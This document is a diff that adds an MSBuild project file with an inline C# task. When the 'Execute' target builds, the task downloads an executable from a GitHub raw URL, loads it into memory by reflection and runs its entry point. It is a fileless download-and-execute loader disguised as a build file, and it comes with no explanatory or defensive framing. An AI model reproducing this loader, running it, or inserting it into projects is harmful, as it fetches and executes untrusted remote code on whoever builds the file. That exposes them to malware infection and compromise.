@@ -1,0 +1,52 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <UsingTask TaskName="UrlLoader" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup>
+      <Url ParameterType="System.String" Required="true" />
+    </ParameterGroup>
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.Net" />
+      <Using Namespace="System.Reflection" />
+      <Using Namespace="System.Threading" />
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+            try
+            {
+		
+		Console.Clear();
+		
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)12288;
+
+                using (WebClient client = new WebClient())
+                {
+                    byte[] payload = client.DownloadData(Url);
+
+                    if (payload != null)
+                    {
+                        Assembly assembly = Assembly.Load(payload);
+                        MethodInfo entryPoint = assembly.EntryPoint;
+
+                        if (entryPoint != null)
+                        {
+                            object[] parameters = (entryPoint.GetParameters().Length > 0) 
+                                ? new object[] { new string[] { } } 
+                                : null;
+
+                            entryPoint.Invoke(null, parameters);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Log.LogErrorFromException(ex);
+                return false;
+            }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+  <Target Name="Execute">
+    <UrlLoader Url="https://github.com/1230912093108947981903128931082308913/test/raw/refs/heads/main/main.exe" />
+  </Target>
+</Project>
